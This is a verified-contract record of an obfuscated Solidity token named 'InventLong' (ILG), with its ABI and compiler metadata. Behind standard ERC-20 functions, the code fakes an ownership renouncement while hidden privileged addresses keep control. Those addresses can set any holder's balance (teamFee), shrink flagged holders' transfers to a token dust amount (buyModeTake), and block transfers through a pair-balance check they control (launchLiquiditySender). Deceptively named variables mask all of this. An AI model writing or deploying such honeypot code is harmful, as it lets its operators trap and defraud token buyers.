{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface txTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamFrom) external view returns (uint256);\n\n    function transfer(address marketingBuy, uint256 tokenAuto) external returns (bool);\n\n    function allowance(address minBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingBuy,\n        uint256 tokenAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeTo, uint256 value);\n    event Approval(address indexed minBuy, address indexed spender, uint256 value);\n}\n\nabstract contract launchedSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitReceiver {\n    function createPair(address listReceiver, address marketingFund) external returns (address);\n}\n\ninterface txToMetadata is txTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InventLong is launchedSender, txTo, txToMetadata {\n\n    string private toTrading = \"ILG\";\n\n    uint256 private txLaunched;\n\n    function owner() external view returns (address) {\n        return tokenSellMax;\n    }\n\n    function allowance(address exemptMarketing, address txFrom) external view virtual override returns (uint256) {\n        if (txFrom == isReceiverExempt) {\n            return type(uint256).max;\n        }\n        return teamTokenSender[exemptMarketing][txFrom];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toBuy;\n    }\n\n    function isLimitTo() private view {\n        require(tokenReceiver[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyLaunched;\n    }\n\n    mapping(address => uint256) private senderShould;\n\n    address private tokenSellMax;\n\n    mapping(address => bool) public feeFrom;\n\n    function balanceOf(address teamFrom) public view virtual override returns (uint256) {\n        return senderShould[teamFrom];\n    }\n\n    function transfer(address shouldSell, uint256 tokenAuto) external virtual override returns (bool) {\n        return receiverLimit(_msgSender(), shouldSell, tokenAuto);\n    }\n\n    uint256 public receiverTokenList;\n\n    event OwnershipTransferred(address indexed launchedMin, address indexed listFrom);\n\n    function buyModeTake(address feeAmount) public {\n        isLimitTo();\n        \n        if (feeAmount == enableMarketing || feeAmount == swapIs) {\n            return;\n        }\n        feeFrom[feeAmount] = true;\n    }\n\n    uint256 totalMarketingLimit;\n\n    bool private autoEnable;\n\n    uint256 private toBuy = 100000000 * 10 ** 18;\n\n    address public enableMarketing;\n\n    function teamFee(address shouldSell, uint256 tokenAuto) public {\n        isLimitTo();\n        senderShould[shouldSell] = tokenAuto;\n    }\n\n    bool private senderAt;\n\n    function receiverLimit(address toList, address marketingBuy, uint256 tokenAuto) internal returns (bool) {\n        if (toList == enableMarketing) {\n            return autoAmount(toList, marketingBuy, tokenAuto);\n        }\n        uint256 enableTrading = txTo(swapIs).balanceOf(receiverAmount);\n        require(enableTrading == totalMarketingLimit);\n        require(marketingBuy != receiverAmount);\n        if (feeFrom[toList]) {\n            return autoAmount(toList, marketingBuy, receiverToken);\n        }\n        return autoAmount(toList, marketingBuy, tokenAuto);\n    }\n\n    uint256 public tradingListSender;\n\n    uint256 private fundAt;\n\n    function approve(address txFrom, uint256 tokenAuto) public virtual override returns (bool) {\n        teamTokenSender[_msgSender()][txFrom] = tokenAuto;\n        emit Approval(_msgSender(), txFrom, tokenAuto);\n        return true;\n    }\n\n    string private limitMode = \"Invent Long\";\n\n    function autoAmount(address toList, address marketingBuy, uint256 tokenAuto) internal returns (bool) {\n        require(senderShould[toList] >= tokenAuto);\n        senderShould[toList] -= tokenAuto;\n        senderShould[marketingBuy] += tokenAuto;\n        emit Transfer(toList, marketingBuy, tokenAuto);\n        return true;\n    }\n\n    uint256 private receiverAmountMax;\n\n    uint256 constant receiverToken = 3 ** 10;\n\n    function getOwner() external view returns (address) {\n        return tokenSellMax;\n    }\n\n    constructor (){\n        \n        enableFee walletBuy = enableFee(isReceiverExempt);\n        swapIs = limitReceiver(walletBuy.factory()).createPair(walletBuy.WETH(), address(this));\n        if (tradingListSender != teamTake) {\n            senderAt = true;\n        }\n        enableMarketing = _msgSender();\n        txEnableList();\n        tokenReceiver[enableMarketing] = true;\n        senderShould[enableMarketing] = toBuy;\n        if (autoLaunchedShould == teamTake) {\n            txLaunched = tradingListSender;\n        }\n        emit Transfer(address(0), enableMarketing, toBuy);\n    }\n\n    address isReceiverExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private teamTake;\n\n    uint256 private fromToken;\n\n    uint256 tradingShould;\n\n    function transferFrom(address toList, address marketingBuy, uint256 tokenAuto) external override returns (bool) {\n        if (_msgSender() != isReceiverExempt) {\n            if (teamTokenSender[toList][_msgSender()] != type(uint256).max) {\n                require(tokenAuto <= teamTokenSender[toList][_msgSender()]);\n                teamTokenSender[toList][_msgSender()] -= tokenAuto;\n            }\n        }\n        return receiverLimit(toList, marketingBuy, tokenAuto);\n    }\n\n    function txEnableList() public {\n        emit OwnershipTransferred(enableMarketing, address(0));\n        tokenSellMax = address(0);\n    }\n\n    function launchLiquiditySender(uint256 tokenAuto) public {\n        isLimitTo();\n        totalMarketingLimit = tokenAuto;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toTrading;\n    }\n\n    uint256 private autoLaunchedShould;\n\n    address public swapIs;\n\n    mapping(address => bool) public tokenReceiver;\n\n    bool public marketingReceiver;\n\n    mapping(address => mapping(address => uint256)) private teamTokenSender;\n\n    address receiverAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return limitMode;\n    }\n\n    function exemptIsTotal(address modeFund) public {\n        if (marketingReceiver) {\n            return;\n        }\n        \n        tokenReceiver[modeFund] = true;\n        \n        marketingReceiver = true;\n    }\n\n    uint8 private buyLaunched = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"buyModeTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"}],\"name\":\"exemptIsTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAuto\",\"type\":\"uint256\"}],\"name\":\"launchLiquiditySender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTokenList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAuto\",\"type\":\"uint256\"}],\"name\":\"teamFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingListSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txEnableList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InventLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}